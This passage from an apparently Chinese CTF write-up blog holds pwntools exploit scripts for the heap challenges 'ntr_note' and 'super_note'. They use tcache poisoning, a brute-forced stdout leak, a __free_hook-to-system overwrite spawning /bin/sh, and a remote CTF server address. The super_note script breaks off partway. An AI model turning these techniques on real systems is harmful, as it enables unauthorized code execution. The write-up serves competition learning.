class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>system_addr <span class=\"token operator\">>></span><span class=\"token number\">16</span><span class=\"token operator\">>></span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#gdb.attach(p,\"printf\")</span>\n\n<span class=\"token comment\">#pause()</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"61happy\\x00\"</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"/bin/sh\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#payload = </span>\n\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<h1 id=\"ntr_note\"><a class=\"markdownIt-Anchor\" href=\"#ntr_note\">#</a> ntr_note</h1>\n<p>libc-2.31 没 show，爆破了两次，stdout 进行泄露，脚本 1/256 成功率</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- coding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> galatea\ncontext<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>timeout <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#context.log_level = 'debug'</span>\n\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'ntr_note'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'ntr_note'</span><span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span>elf<span class=\"token punctuation\">.</span>libc\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\n\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n  p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ntr_note'</span><span class=\"token punctuation\">)</span>\n  <span class=\"token comment\">#p = process([\"qemu-aarch64\",\"-L\",\"\",binary])</span>\n  <span class=\"token comment\">#p = process([\"qemu-aarch64\",\"-L\",\"\",-g,\"1234\",binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n  host <span class=\"token operator\">=</span> <span class=\"token string\">\"81.68.86.115\"</span>\n  port <span class=\"token operator\">=</span>  <span class=\"token string\">\"10000\"</span>\n  p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>     \t<span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x7f\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>     \t<span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\xf7\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b  \t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b \t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\": 0x%x\"</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload\t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>      \t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload\t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a    \t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a    \t<span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n  pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice >>\"</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"size:\"</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"content:\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"idx:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"idx:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n  sa<span class=\"token punctuation\">(</span><span class=\"token string\">\"content:\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">to_pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span>\n\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">0x7010</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#4</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#5</span>\n  <span class=\"token comment\">#dbg()</span>\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">9</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0007000700070007</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n  \n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#6</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#7</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#8</span>\n\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>\n\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\xb0\"</span><span class=\"token punctuation\">)</span> \n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#9</span>\n\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>p16<span class=\"token punctuation\">(</span><span class=\"token number\">0x26a0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#10</span>\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0001000100010001</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  \n  payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x00\"</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span> <span class=\"token comment\">#11</span>\n\n  leak <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  stdout <span class=\"token operator\">=</span> leak <span class=\"token operator\">+</span> <span class=\"token number\">0x336da</span>\n  libc_base <span class=\"token operator\">=</span> stdout <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"_IO_2_1_stdout_\"</span><span class=\"token punctuation\">]</span>\n  system_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span>\n  __free_hook <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"__free_hook\"</span><span class=\"token punctuation\">]</span>\n  __malloc_hook <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"__malloc_hook\"</span><span class=\"token punctuation\">]</span>\n\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"leak\"</span><span class=\"token punctuation\">,</span>leak<span class=\"token punctuation\">)</span>\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"stdout\"</span><span class=\"token punctuation\">,</span>stdout<span class=\"token punctuation\">)</span>\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"__free_hook\"</span><span class=\"token punctuation\">,</span>__free_hook<span class=\"token punctuation\">)</span>\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"__malloc_hook\"</span><span class=\"token punctuation\">,</span>__malloc_hook<span class=\"token punctuation\">)</span>\n  \n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#12</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#13</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"/bin/sh\\x00\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#14</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span>\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>__free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span>\n\n  p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\ni <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n    i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n    log<span class=\"token punctuation\">.</span>warn<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        to_pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span> Exception<span class=\"token punctuation\">:</span>\n        p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">continue</span>\n</code></pre>\n<h1 id=\"super_note\"><a class=\"markdownIt-Anchor\" href=\"#super_note\">#</a> super_note</h1>\n<p>先爆破 std_out，再在栈上写 ORW，终于会了</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \n<span class=\"token keyword\">import</span> galatea \ncontext<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>timeout <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'super_note'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'super_note'</span><span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n  p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n  <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n  <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n  host <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n  port <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n  p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n  pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice:\"</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>context<span class=\"token operator\">=</span><span class=\"token string\">\"aaa\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n  sa<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>context<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">to_pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span>\n\n  show<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n  p<span class=\"token punctuation\">.</span>recvuntil<span 